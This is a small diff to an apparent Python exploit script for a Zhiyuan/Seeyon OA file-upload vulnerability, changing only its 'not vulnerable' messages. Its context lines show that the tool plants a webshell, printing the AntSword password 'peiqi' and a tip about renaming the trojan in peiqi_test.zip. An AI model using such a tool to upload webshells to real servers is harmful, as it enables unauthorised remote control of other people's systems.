@@ -36,7 +36,7 @@ def Zhiyuan_upload(Url):
                 sys.exit("上传文件失败")
             POC_2(urldata, cookie, reg, headers)
         else:
-            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(urldata))
+            print(Vcolors.WARNING + "[x] 不存在Zhiyuan_upload漏洞" +Vcolors.ENDC)
     except Exception as e:
         print(vuln_url)
         print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(urldata),e)
@@ -56,7 +56,7 @@ def POC_2(Url, cookie, reg, headers):
             print("\033[32m[o] 蚁剑密码: peiqi \033[0m".format(urldata))
             print("\033[32m[o] 如果目标webshell无法访问，请更换 peiqi_test.zip 中的木马名称 \033[0m".format(urldata))
         else:
-                print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(urldata))
+                print("\033[31m[x] 目标 {} 不存在Zhiyuan_upload漏洞 \033[0m".format(urldata))
     except Exception as e:
         print('1')
         print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(urldata),e)
